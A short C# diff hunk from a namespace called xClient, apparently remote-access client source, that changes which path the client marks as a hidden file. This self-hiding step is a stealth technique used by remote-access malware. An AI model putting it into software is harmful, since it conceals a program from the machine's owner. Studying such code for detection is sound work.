@@ -163,7 +163,7 @@ namespace xClient
                 {
                     try
                     {
-                        File.SetAttributes(ClientData.InstallPath, FileAttributes.Hidden);
+                        File.SetAttributes(ClientData.CurrentPath, FileAttributes.Hidden);
                     }
                     catch (Exception)
                     {
